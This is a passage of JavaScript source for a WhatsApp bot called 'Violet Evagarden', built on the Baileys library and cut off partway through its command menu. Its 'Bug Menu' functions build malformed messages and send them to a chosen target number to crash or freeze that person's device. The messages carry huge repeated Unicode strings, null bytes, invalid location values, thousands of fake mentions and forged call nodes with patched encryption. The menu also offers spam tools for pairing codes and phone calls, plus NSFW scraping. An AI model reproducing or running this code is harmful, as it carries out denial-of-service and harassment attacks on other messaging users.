/*
BY ANDRI STORE
*/
require('../setting/config');

const fs = require('fs');
const path = require('path');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const ms = require("parse-ms");
const fetch = require("node-fetch");
const FormData = require("form-data");
const JsConfuser = require('js-confuser');
const moment = require("moment-timezone");
var crypto = require("crypto")
let { randomBytes } = require("crypto")
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, downloadAndSaveMediaMessage, useMultiFileAuthState, downloadMediaMessage, generateWAMessageFromContent, generateMessageID, getContentType, prepareWAMessageMedia, downloadContentFromMessage, generateRandomMessageId } = require("@whiskeysockets/baileys");
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
module.exports = reo = async (reo, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
  m.mtype === "conversation" ? m.message.conversation :
  m.mtype === "imageMessage" ? m.message.imageMessage.caption :
  m.mtype === "videoMessage" ? m.message.videoMessage.caption :
  m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
  m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
  m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
  m.mtype === "templateReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
  m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
  m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
  m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply?.selectedRowId || m.text :
  ''
);
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", "."];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : "";
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const unli = JSON.parse(fs.readFileSync("./database/unli.json"))
function getDisplayName(id) {
    let contact = store.contacts[id] || {};
    return contact.name || contact.verifiedName || '@' + id.split('@')[0];
}
const isPremium = premium.includes(m.sender)
const owner2 = JSON.parse(fs.readFileSync("./database/owner.json"))
const isOwner = owner2.includes(m.sender) ? true : m.sender == owner+"@s.whatsapp.net" ? true : m.fromMe ? true : false
const isUnli = unli.includes(m.chat)
// Consta Variable
const sender = m.key.fromMe
  ? (reo?.user?.id?.split(":")[0] || reo?.user?.id?.split(":")[0]) + "@s.whatsapp.net"
  : (m.key.participant || m.key.remoteJid);
const senderNumber = sender?.split('@')[0];
const senderName = "@" + senderNumber;
const botNumber = await reo.decodeJid(reo.user.id);
const isCmd = typeof body === 'string' && body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const nomordepay = [
  "6281371379077",
];


// Group function
const groupMetadata = isGroup ? await reo.groupMetadata(m.chat).catch((e) => ({})) : {};
const groupOwner = isGroup ? groupMetadata.owner || "" : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup && Array.isArray(participants)
    ? participants.filter(v => v.admin !== null).map(v => v.id)
    : [];
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const speed = require('performance-now')
const os = require("os")
const tempDir = path.join(__dirname, 'temp');
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir);
}

//CONST FOTO
const foto = fs.readFileSync('./image/foto1.jpg')
const yuda = fs.readFileSync('./image/foto2.jpg')
const musik = fs.readFileSync('./image/violet.mp3')
const bug = fs.readFileSync('./image/bokep.mp4')
// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, formatp, sleep } = require('./lib/myfunction');

// Time
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')

  //Catbox
async function CatBox(filePath) {
  try {
    if (!fs.existsSync(filePath)) throw new Error("File not found");

    const form = new FormData();
    form.append('reqtype', 'fileupload');
    form.append('fileToUpload', fs.createReadStream(filePath));

    const res = await axios.post('https://catbox.moe/user/api.php', form, {
      headers: form.getHeaders()
    });

    if (res.status === 200 && res.data) {
      return res.data.trim();
    } else {
      throw new Error(`Upload failed with status: ${res.status}`);
    }
  } catch (err) {
    throw new Error(`Upload failed: ${err.message}`);
  }
}
async function getFile(url) {
    try {
        const response = await axios({
            method: 'GET',
            url: url,
            responseType: 'arraybuffer'
        });
        const tempPath = path.join(__dirname, 'temp.png'); // Simpan sebagai PNG sementara
        const webpPath = path.join(__dirname, 'temp.webp'); // Simpan hasil WebP
        
        // Simpan file asli (PNG/JPG)
        fs.writeFileSync(tempPath, response.data);
        // Konversi ke WebP menggunakan Sharp
        await sharp(tempPath)
            .toFormat('webp')
            .toFile(webpPath);
        // Hapus file asli setelah dikonversi
        fs.unlinkSync(tempPath);
        return {
            data: webpPath,
            mimetype: 'image/webp'
        };
    } catch (error) {
        console.error('Gagal mengambil file:', error);
        return null;
    }
}
       //Pp for qc
           let ppuser
           try {
           ppuser = await reo.profilePictureUrl(m.sender, 'image')
           } catch (err) {
           ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
           }
           
// Console log
if (m.message) {
  console.log(chalk.hex("#8A2BE2")("Violet Evagarden"));
  console.log(chalk.hex("#00FF00")("Created By Andri Store"));
  console.log(chalk.hex("#8A2BE2")("INFORMATION : "));
  console.log(chalk.hex("#FFD700")("Date : ") + chalk.cyan(new Date().toLocaleString()));
  console.log(chalk.hex("#FFD700")("Message : ") + chalk.white(m.body || m.mtype));
  console.log(chalk.hex("#FFD700")("User Send : ") + chalk.magenta(pushname));
  console.log(chalk.hex("#FFD700")("Number   : ") + chalk.red(senderNumber));
  if (m.isGroup) {
      console.log(chalk.hex("#8A2BE2")("INFO DARI GROUP"));
      console.log(chalk.hex("#FFD700")("Group   : ") + chalk.green(groupName));
      console.log(chalk.hex("#FFD700")("Id Group  : ") + chalk.red(m.chat));
  }
  console.log(chalk.hex("#8A2BE2")("============================="));
}

if (global.autoTyping) {
if (command) {
reo.sendPresenceUpdate('composing', from)
}
}
reo.autoshalat = reo.autoshalat ? reo.autoshalat : {}
	let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? reo.user.id : m.sender
	let id = m.chat 
    if(id in reo.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:18',
    terbit: '05:42',
    dhuha: '06:02',
    dzuhur: '11:32',
    ashar: '14:53',
    magrib: '17:23',
    isya: '18:38',
    }

//FUNCTION UCAPAN
function getGreeting() {
const hours = new Date().getHours();
  if (hours >= 0 && hours < 12) {
    return "Good Morning 🌆";
  } else if (hours >= 12 && hours < 18) {
    return " Good Afternoon 🌇";
  } else {
    return "Good Night 🌌";
  }
}
const greeting = getGreeting();

let example = (teks) => {
return `\n ❌
Contoh: ${prefix + command} ${teks}\n`
}

const dbreply = (teks) => { 
reo.sendMessage(m.chat, { react: { text: "❗",key: m.key,}}); 
databaserep(teks)
    }        
    
const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363419091007808@newsletter`,
newsletterName: `Andri Store`,
jpegThumbnail: "https://aliceecdn.vercel.app/file/ce6d8a830c.jpeg",
caption: 'Andri Store',
inviteExpiration: Date.now() + 1814400000
}
}}

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: foto,
      itemCount: "8888",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Andri`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363419091007808@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
   //Nsfw
async function randomNsFw() {
			return new Promise((resolve, reject) => {
				const page = Math.floor(Math.random() * 1153)
				axios.get('https://sfmcompile.club/page/' + page).then((data) => {
					const $ = cheerio.load(data.data)
					const hasil = []
					$('#primary > div > div > ul > li > article').each(function (a, b) {
						hasil.push({
							title: $(b).find('header > h2').text(),
							link: $(b).find('header > h2 > a').attr('href'),
							category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
							share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
							views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
							type: $(b).find('source').attr('type') || 'image/jpeg',
							video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
							video_2: $(b).find('video > a').attr('href') || ''
						})
					})
					resolve(hasil)
				})
			})
		}
		

const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast"} : {}) },'message': {extendedTextMessage: {text: "Violet Evagarden" }}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `Reoclint`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6283862861689:+6281371379077\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const totalFitur = () =>{
var mytext = fs.readFileSync("./start/Violet.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length
return numUpper
}


//==================[ AWAL FUNCTION BUG ]===================//
async function blnkmark(target) {
  try {
    const Abimsukasalsa = "\u0000".repeat(20000);

    const msg1 = {
      viewOnceMessage: {
        message: {
          fakeViewOnceMessage: {
            newsletterName: "I am Abim" + "ꦽ".repeat(12000),
            interactiveResponseMessage: {
              jpegThumbnail: null,
              videoMessage: {
                url: "https://example.com/videomp4",
                buttons: "...",
                body: {
                  text: "Raja - Abim Is" + "ꦽ".repeat(9000)
                },
                buttonsArray: [
                  {
                    name: "call_permission_request",
                    paramsJson: "\u0000".repeat(90000)
                  },
                  {
                    name: "cta_url",
                    buttonParamsJson: Abimsukasalsa,
                    url: "https://wa.me/stickerPack/Abim"
                  },
                  {
                    name: "address_message",
                    buttonParamsJson: "\u0003".repeat(9500)
                  },
                  {
                    name: "cta_call",
                    buttonParamsJson: "\u0000".repeat(9900)
                  }
                ],
                nativeFlowResponseMessage: {
                  name: "call_permission_request"
                }
              },
              systemMessageV2: {
                text: "hi kacung" + "ꦽ".repeat(9000)
              },
              interactiveMessage: {
                body: { text: null }
              }
            }
          }
        }
      },
      messageOptions: "custom",
      contextInfo: {
        adReply: {}
      }
    };

    const msg2 = {
      body: { text: "HAI - MARK" },
      nativeFlowMessage: {
        nativeFlowResponseMessage: {
          inviteExpiration: Date.now() + 9999999999,
          buttons: [
            {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(90000)
            }
          ],
          address: "hp kentang tembus 😂" + "ꦾ".repeat(15000) + "ꦽ".repeat(15000)
        }
      },
      contextInfo: {
        payload: "ꦽꦽꦽ".repeat(300000),
        contextInfo: {
          interactiveMessage: { body: { format: true } }
        },
        participant: "targetjid@s.whatsapp.net",
        mentionedJid: ["0@s.whatsapp.net"]
      },
      fromMe: false,
      caption: null,
      participant: "5521992999999@s.whatsapp.net",
      remoteJid: "0s.whatsapp.net"
    };

    for (const msg of [msg1]) {
      await reo.relayMessage(target, msg, {
        participant: { jid: target },
        messageId: null
      });
    }

    for (const msg of [msg2]) {
      await reo.relayMessage(target, msg, {
        participant: { jid: target },
        messageId: null
      });
    }

    console.log(`🐉 Wolker Your Devices Sending Bug To ${target} successful`);

  } catch (e) {
    console.error(e);
  }
}

async function LocationXz(reo, target) {
  try {
    const imageCrash = "https://files.catbox.moe/p8ynmh.jpg";

    const photo = {
      image: { url: imageCrash }
    };

    const msg = await generateWAMessage(target, photo, {
      upload: sock.waUploadToServer
    });
    
    const liveLocationCrash = {
      liveLocationMessage: {
        degreesLatitude: "Infinity",
        degreesLongitude: "-Infinity",
        accuracyInMeters: 99999999,
        speedInMps: -999,
        magneticHeading: 999,
        caption: "ꦾ".repeat(60000),
        sequenceNumber: Number.MAX_SAFE_INTEGER,
        timeOffset: 999999999999,
        contextInfo: {
          sstanzaI:"X7".repeat(9999),
          mentionedJid: Array.from({ length: 35000 }, (_, i) => `${500000 + i}@s.whatsapp.net`),
          businessMessageForwardInfo: {
            businessOwnerJid: "5521992999999@s.whatsapp.net"
          },
          externalAdReply: {
            title: "ꦾ".repeat(9999),
            body: "©meta ai",
            thumbnailUrl: imageCrash,
            mediaType: 1,
            mediaUrl: "about:blank",
            sourceUrl: "about:blank"
          }
        }
      }
    };

    const locationMessageContent = proto.Message.fromObject({
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "\u900A",
                address: "\u0007".repeat(20000),
                jpegThumbnail: global.thumb,
              },
              hasMediaAttachment: true,
            },
            body: { text: "" },
            nativeFlowMessage: {
              messageParamsJson: "[]".repeat(4000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "\u0003".repeat(1500),
                    sections: [
                      {
                        title: "",
                        rows: [],
                      },
                    ],
                  }),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    name: "\u0003".repeat(2000),
                  }),
                },
              ],
            },
          },
        },
      },
    });

    locationMessageContent.mentionedJid = [
      "1@s.whatsapp.net",
      ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`),
    ];

    const msg2 = generateWAMessageFromContent(
      target,
      locationMessageContent,
      { userJid: target }
    );
    
    await reo.relayMessage(target, liveLocationCrash, {
      messageId: msg.key.id
    });
    
    if (Math.random() > 0.5) {
      await reo.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  { tag: "to", attrs: { jid: target }, content: undefined },
                ],
              },
            ],
          },
        ],
      });
    } else {
      await reo.relayMessage(target, msg.message, { messageId: msg.key.id });
    }
  } catch (err) {}
}

            
async function RizzXstecu(reo, target) {

  const Hidanmsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
          fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
          fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
          mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
          mimetype: "image/webp",
          height: 9999,
          width: 9999,
          directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
          fileLength: 12260,
          mediaKeyTimestamp: "1743832131",
          isAnimated: false,
          stickerSentTs: Date.now(),
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          contextInfo: {
            participant: target,
            mentionedJid: [
              target,
              ...Array.from(
                { length: 1850 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
            },
          },
        },
      },
    },
  };
  
  await reo.relayMessage(target, Hidanmsg, 
   { participant: { jid: target } }
  );
}
    
async function VirtezzRizzX(target, reo) {

   let Hidanmsg2 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "𝐢𝐭'𝐬 𝐎𝐤𝐞𝐲 𝐁𝐫𝐨?!", 
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: -0,
                        },
                        hasMediaAttachment: false,
                    },
                    body: {
                        text: "ꦾ".repeat(60000) + "ោ៝".repeat(20000),
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "cta_call",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(5000),
                                }),
                            },
                            {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(5000),
                                }),
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(5000),
                                }),                         
                            },
                        ],
                        messageParamsJson: "[{".repeat(10000),
                    },
                    contextInfo: {
                        participant: target,
                        mentionJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1900 },
                                () => "1" + Math.floor(Math.random() * 50000000) + "0@s.whatsapp.net",
                            ),
                        ],
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimeStamp: Date.now() + 1814400000,
                            },
                        },
                    },
                },
            },
        },
    };
    
   await reo.relayMessage(target, Hidanmsg2, 
   { participant: { jid: target } }
  );
}            
                

async function InvisRizzX(target, reo) {
    console.log(chalk.red(`Succes Terkirim Bro... ${target}`));

    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending
    } = require("@whiskeysockets/baileys");
    const crypto = require('crypto');

    let RizzXyzzmsg = (
        await reo.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await reo.assertSessions(RizzXyzzmsg);

    let HidanRizzX = () => {
        let map = {};
        return {
            mutex(key, fn) {
                if (!map[key]) {
                    map[key] = { task: Promise.resolve() };
                }
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let HidanRizzX2 = HidanRizzX();
    let RizzXyzzmsg2 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    
    // Simpan fungsi asli sebelum dimodifikasi
    let originalCreateParticipantNodes = reo.createParticipantNodes?.bind(reo);
    let originalEncodeWAMessage = reo.encodeWAMessage?.bind(reo);

    reo.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length)
            return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (reo.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let messagesArray = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = reo.authState.creds.me || {};
        let omak = meLid ? jidDecode(meLid)?.user : null;

        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            messagesArray.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y)
                    msg = dsmMessage;

                let bytes = RizzXyzzmsg2(originalEncodeWAMessage ? originalEncodeWAMessage(msg) : encodeWAMessage(msg));

                return HidanRizzX2.mutex(jid, async () => {
                    let { type, ciphertext } = await reo.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg')
                        shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let nedava = crypto.randomBytes(32);
    let havana = Buffer.concat([nedava, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await reo.createParticipantNodes(
        RizzXyzzmsg,
        { conversation: "y" },
        { count: '0' }
    );

    let expensionNode = {
        tag: "call",
        attrs: {
            to: target,
            id: reo.generateMessageTag(),
            from: reo.user.id || reo.authState.creds.me.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase(),
                "call-creator": reo.user.id || reo.authState.creds.me.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(reo.authState.creds.account || reo.authState.creds, true)
                    }]
                    : []
                )
            ]
        }]
    };

    await reo.sendNode(expensionNode);
    
    // Restore original function
    if (originalCreateParticipantNodes) {
        reo.createParticipantNodes = originalCreateParticipantNodes;
    }
}
    

    

    

        

                    
                        

    
        
                        

    

    
        
          

    


//=================[END FUNCTION BUGS]=================//
  
 //End
 async function Reply(teks) {
const Shen = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `𝐕𝐢𝐨𝐥𝐞𝐭 𝐄𝐯𝐚𝐠𝐚𝐫𝐝𝐞𝐧`,
newsletterJid: `120363419091007808@newsletter`,
},
externalAdReply: {  
showAdAttribution: true,
title: `𝐕𝐢𝐨𝐥𝐞𝐭 𝐕𝟏`,
body: 'ᴀɴᴅʀɪ sᴛᴏʀᴇ',
thumbnailUrl: `https://aliceecdn.vercel.app/file/ce6d8a830c.jpeg`,
sourceUrl: 'depay.com',
},
},
text: teks,
}
return reo.sendMessage(m.chat, Shen, {
quoted: lol,
})
}

async function payreply(teks) {
const Shen = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: ``,
newsletterJid: `120363419091007808@newsletter`,
},
externalAdReply: {  
showAdAttribution: true,
title: `𝐕𝐢𝐨𝐥𝐞𝐭 𝐕𝟏`,
body: 'ᴀɴᴅʀɪ sᴛᴏʀᴇ',
thumbnailUrl: `https://aliceecdn.vercel.app/file/ce6d8a830c.jpeg`,
sourceUrl: 'violet.com',
},
},
text: teks,
}
return reo.sendMessage(m.chat, Shen, {
quoted: lol,
})
}

async function listbut2(chat, teks, listnye, lol) {
 let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: "© 𝐕𝐢𝐨𝐥𝐞𝐭 𝐄𝐯𝐚𝐠𝐚𝐫𝐝𝐞𝐧"
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listnye)
}]
}) 
})} 
}}, {userJid: m.sender, quoted: lol}) 
await reo.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})	
}   

//Case Menu
switch (command) {
case 'menu': {
await reo.sendMessage(m.chat, { react: { text: "⚡",key: m.key,}}); 
let teksnya = `[ 𝐕𝐈𝐎𝐋𝐄𝐓 𝐄𝐕𝐀𝐆𝐀𝐑𝐃𝐄𝐍 𝐕𝟏 ]
( 🚀 ) Holaa ☇ @${pushname}  use the bot feature wisely, the creator is not responsible for what you do with this bot, enjoy.

╔─═⊱「 𝗩𝗶𝗼𝗹𝗲𝘁 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶𝗼𝗻 」─═⬡ 
║⎔ ☇ ᴠᴇʀsɪᴏɴ : *𝟷.𝟶* 
║⎔ ☇ ᴅᴇᴠᴇʟᴏᴘᴇʀ : ᴀɴᴅʀɪ sᴛᴏʀᴇ 
║⎔ ☇ ʙᴏᴛ ɴᴀᴍᴇ : ᴠɪᴏʟᴇᴛ ᴇᴠᴀɢᴀʀᴅᴇɴ
║⎔ ☇ sᴛᴀᴛᴜs sᴄʀɪᴘᴛ : ғʀᴇᴇ
║⎔ ☇ ᴛʏᴘᴇ : ᴄᴀsᴇ
║⎔ ☇ ʀᴜɴᴛɪᴍᴇ : ${runtime(process.uptime())}
┗━━━━━━━━━━━━━━━━━▢

╔─═⊱「 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂 」─═⬡
║✧.addmurbug
║╰┈➤ Untuk add akses user
║✧.delmurbug
║╰┈➤ Untuk del akses user
║✧.addowner
║╰┈➤ Untuk add owner ke user
║✧.delowner
║╰┈➤ Untuk del owner ke user
║✧.addakses
║╰┈➤ Untuk add akses ke group
║✧.delakses
║╰┈➤ Untuk del akses ke group
║✧.public
║╰┈➤ Untuk mengatur bot mode public
║✧.self
║╰┈➤ Untuk mengatur bot mode self
┗━━━━━━━━━━━━━━━━━━━⎔
  
╔─═⊱「 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂 」─═⬡
║✧.violetblank 
║╰┈➤ Blank Screen Device
║✧.violetinvis 
║╰┈➤ Violet Delay Hard Invisible
║✧.violet
║╰┈➤ Delay Hard Violet
┗━━━━━━━━━━━━━━━━━━━⎔

╔─═⊱「 𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂 」─═⬡
║✧.tourl
║╰┈➤ Untuk ubah foto ke link
║✧.qc 
║╰┈➤ Untuk Membuat Quoted costum
║✧.brat
║╰┈➤ Untuk membuat stiker costum
║✧.cekidch
║╰┈➤ Untuk cek id channel 
║✧.tiktok
║╰┈➤ Untuk downloader tiktok
║✧.rvo
║╰┈➤ Untuk readviewonce foto
║✧.play
║╰┈➤ Untuk downloader video youtube
║✧.reactch
║╰┈➤ Reaction to channel whatsapp
║✧.spampair
║╰┈➤ Untuk spam to pairing code
║✧.spamtelp
║╰┈➤ Untuk spam telpon user
┗━━━━━━━━━━━━━━━━━━━⎔ 

╔─═⊱「 𝗙𝘂𝗻 𝗠𝗲𝗻𝘂 」─═⬡
║✧.cekganteng
║╰┈➤ Untuk cek ganteng user
║✧.cekkhodam
║╰┈➤ Untuk cek khodam user
║✧.sertifikattolol
║╰┈➤ Untuk membuat sertifikat user
┗━━━━━━━━━━━━━━━━━━━⎔

╔─═⊱「 𝗡𝘀𝗳𝘄 𝗠𝗲𝗻𝘂 」─═⬡
║.hentaineko
║╰┈➤ Untuk mu yang nafsuan 
║.nsfw
║╰┈➤ Untuk mu yang nafsuan
║.hentai
║╰┈➤ Untuk mu yang nafsuan
┗━━━━━━━━━━━━━━━━━━⎔ `
     

    let buttons = [
        { buttonId: ".sc", buttonText: { displayText: "ʙᴜʏ sᴄʀɪᴘᴛ" } }
    ];

    let buttonMessage = {
        image: { url: `https://img1.pixhost.to/images/10918/671381175_andri-store.jpg` },        
        caption: teksnya,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐕𝐢𝐨𝐥𝐞𝐭 𝐕𝟏`,
                body: `© ᴀɴᴅʀɪ sᴛᴏʀᴇ `,
                thumbnailUrl: `https://img1.pixhost.to/images/10918/671381175_andri-store.jpg`, // isi tourl
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: false, 
            }
        },
        footer: "© 𝐕𝐢𝐨𝐥𝐞𝐭 𝐄𝐯𝐚𝐠𝐚𝐫𝐝𝐞𝐧",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: " ",
                sections: [
                    {
